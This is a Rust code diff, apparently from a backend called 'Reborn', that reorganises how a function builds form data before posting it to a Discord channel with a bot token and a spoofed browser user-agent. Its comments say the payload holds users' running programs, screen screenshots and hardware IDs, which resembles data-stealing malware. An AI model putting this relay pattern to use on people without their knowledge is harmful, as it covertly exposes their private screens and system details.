@@ -15,14 +15,23 @@ lazy_static::lazy_static! {
 // The data includes the users running programs, the
 // a screenshot of the users screen, the users hwid, etc.
 pub async fn send_message(channel: i64, body: web::Json<MessageBody>) -> Option<reqwest::Response> {
+    // Create the form data
+    let mut form = vec![];
+    if body.image.len() > 0 {
+        form.push(("file", &body.image));
+    };
+    if body.hardware_info.len() > 0 {
+        form.push(("file", &body.hardware_info));
+    };
+    if body.embed.len() > 0 {
+        form.push(("embeds", &body.embed));
+    }
+
+    // Send the http request
     return match CLIENT.post(&format!("https://discord.com/api/v8/channels/{}/messages", channel))
         .header("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
         .header("authorization", format!("Bot {}", DISCORD_TOKEN.to_string()))
-        .form(&vec![
-                ("embeds", &format!(r#"[{{"title": "Reborn API Request", "description": "Username: {}\nIdentifier: {}"}}]"#, body.username, body.identifier)),
-                ("file", &body.hardware_info), // Base64 encoded hardware buffer
-                ("file", &body.image)
-        ])
+        .form(&form)
         .send().await 
     {
         Ok(r) => Some(r),
